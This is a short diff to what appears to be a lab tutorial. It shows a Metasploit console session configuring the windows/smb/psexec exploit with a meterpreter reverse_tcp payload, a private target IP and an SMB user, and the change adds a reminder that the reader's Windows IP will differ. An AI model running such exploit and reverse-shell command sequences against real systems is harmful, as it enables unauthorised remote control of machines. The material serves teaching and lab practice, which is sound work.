@@ -85,7 +85,7 @@ msf5 exploit(windows/smb/psexec) >
 msf5 exploit(windows/smb/psexec) ><b> set PAYLOAD windows/meterpreter/reverse_tcp</b>
 PAYLOAD => windows/meterpreter/reverse_tcp
 msf5 exploit(windows/smb/psexec) >
-msf5 exploit(windows/smb/psexec) ><b> set RHOSTS 172.18.112.1</b>
+msf5 exploit(windows/smb/psexec) ><b> set RHOSTS 172.18.112.1 ###REMEMBER!!! YOUR WINDOWS IP WILL BE DIFFERENT</b>
 RHOSTS => 172.18.112.1
 msf5 exploit(windows/smb/psexec) ><b> set SMBUSER adhd</b>
 SMBUSER => adhd
